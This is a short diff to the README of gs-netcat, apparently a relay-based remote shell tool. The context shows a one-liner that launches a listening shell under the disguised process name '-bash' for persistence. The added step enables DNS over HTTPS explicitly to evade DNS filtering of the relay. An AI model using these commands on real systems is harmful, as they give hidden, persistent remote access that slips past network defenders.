@@ -273,6 +273,12 @@ Alternativly and if you do not have root privileges then just append the followi
 ```
 killall -0 gs-netcat 2>/dev/null || (GSOCKET_ARGS="-s MySecret -liqD" SHELL=/bin/bash exec -a -bash /usr/local/bin/gs-netcat)
 ```
+
+7. Use DNS Over HTTPs to evade DNS based filtering of relay address
+```
+export GS_SECURE_DNS=1
+```
+
 ---
 **Crypto / Security Mumble Jumble**
 1. The security is end-2-end. This means from User-2-User (and not just to the Relay Network). The Relay Network relays only (encrypted) data to and from the Users. 
